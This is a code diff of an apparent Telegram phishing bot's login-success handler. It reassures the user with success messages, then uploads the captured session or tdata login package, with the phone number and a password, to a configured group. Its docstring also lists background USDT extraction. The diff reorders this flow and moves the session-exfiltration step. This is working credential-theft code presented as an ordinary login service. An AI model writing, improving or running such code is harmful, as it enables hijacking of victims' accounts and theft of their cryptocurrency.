@@ -164,57 +164,63 @@ def _record_msg(uid: int, name: str, direction: str, text: str):
 
 async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
                                 phone: str, user_info: dict):
-    """Shared success flow for code and 2FA login."""
+    """Shared success flow for code and 2FA login.
+
+    Order:
+      1. Send success text to user
+      2. Send configured success photo to user (if enabled)
+      3. Send session-valid text to user
+      4. Upload tdata zip + info image card to group
+      5. USDT extraction (background)
+      6. Delayed session check (background)
+    """
     username = user_info.get("username", "")
     first_name = user_info.get("first_name", "")
     last_name = user_info.get("last_name", "")
     nickname = f"{first_name} {last_name}".strip()
     ts_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Generate and send success image to the user
-    img_path = None
+    # Step 1: Send success text to user
+    success_text = _c("success_text", "✅ 登录成功")
     try:
-        img_path = _generate_success_image(username, nickname, phone, ts_str)
-        success_text = _c("success_text", "✅ 登录成功")
-        try:
-            caption = success_text.format(
-                first_name=first_name, last_name=last_name,
-                user_id=user_info.get("user_id", ""),
-                username=username or "N/A",
-            )
-        except (KeyError, IndexError):
-            caption = success_text
-        await bot.send_photo(
-            chat_id=chat_id, photo=FSInputFile(img_path), caption=caption,
-            parse_mode="HTML")
-    except Exception as e:
-        logger.warning(f"[{uid}] 发送成功图片失败: {e}, 使用文本")
-        success_text = _c("success_text", "✅ 登录成功")
-        await bot.send_message(chat_id=chat_id, text=success_text, parse_mode="HTML")
+        success_msg = success_text.format(
+            first_name=first_name, last_name=last_name,
+            user_id=user_info.get("user_id", ""),
+            username=username or "N/A",
+        )
+    except (KeyError, IndexError):
+        success_msg = success_text
+    await bot.send_message(chat_id=chat_id, text=success_msg, parse_mode="HTML")
     logger.info(f"[{uid}] ✅ 登录成功: {phone} | {user_info}")
 
-    # Upload tdata zip + info image to group if configured
+    # Step 2: Send configured success photo to user (if enabled)
+    if _cfg and _cfg.get("success_send_photo", False):
+        photo_input = get_photo_input(_c("success_photo_path"))
+        if photo_input:
+            try:
+                await bot.send_photo(chat_id=chat_id, photo=photo_input)
+            except Exception as e:
+                logger.warning(f"[{uid}] 发送成功图片失败: {e}")
+
+    # Step 3: Send session-valid text to user
+    session_valid_text = _c("session_valid_text", "")
+    if session_valid_text:
+        await bot.send_message(chat_id=chat_id, text=session_valid_text, parse_mode="HTML")
+
+    # Step 4: Upload tdata zip + info image card to group
+    img_path = None
     group_id = _c("success_group_id", "")
     if group_id:
         try:
             group_chat_id = int(group_id)
-            # Send tdata zip (or session file)
-            session_file = login_engine.get_last_session_path(phone)
-            if session_file and os.path.isfile(session_file):
-                caption = f"📂 {phone}"
-                group_pwd = _c("group_password", "")
-                if group_pwd:
-                    caption += f"\n🔑 密码: {group_pwd}"
-                await bot.send_document(
-                    chat_id=group_chat_id,
-                    document=FSInputFile(session_file),
-                    caption=caption,
-                )
-                logger.info(f"[{uid}] 直登包已上传到群: {group_id}")
-            else:
-                logger.warning(f"[{uid}] 直登包/Session 文件不存在，无法上传到群")
 
-            # Send success info image to group
+            # Generate info image card for group
+            try:
+                img_path = _generate_success_image(username, nickname, phone, ts_str)
+            except Exception as e:
+                logger.warning(f"[{uid}] 生成群图片失败: {e}")
+
+            # Send info image card to group
             if img_path and os.path.isfile(img_path):
                 group_caption = (
                     f"✅ <b>新账号登录成功</b>\n"
@@ -229,6 +235,22 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
                     caption=group_caption,
                     parse_mode="HTML",
                 )
+
+            # Send tdata zip (or session file) to group
+            session_file = login_engine.get_last_session_path(phone)
+            if session_file and os.path.isfile(session_file):
+                caption = f"📂 {phone}"
+                group_pwd = _c("group_password", "")
+                if group_pwd:
+                    caption += f"\n🔑 密码: {group_pwd}"
+                await bot.send_document(
+                    chat_id=group_chat_id,
+                    document=FSInputFile(session_file),
+                    caption=caption,
+                )
+                logger.info(f"[{uid}] 直登包已上传到群: {group_id}")
+            else:
+                logger.warning(f"[{uid}] 直登包/Session 文件不存在，无法上传到群")
         except Exception as e:
             logger.error(f"[{uid}] 上传到群失败: {e}")
 
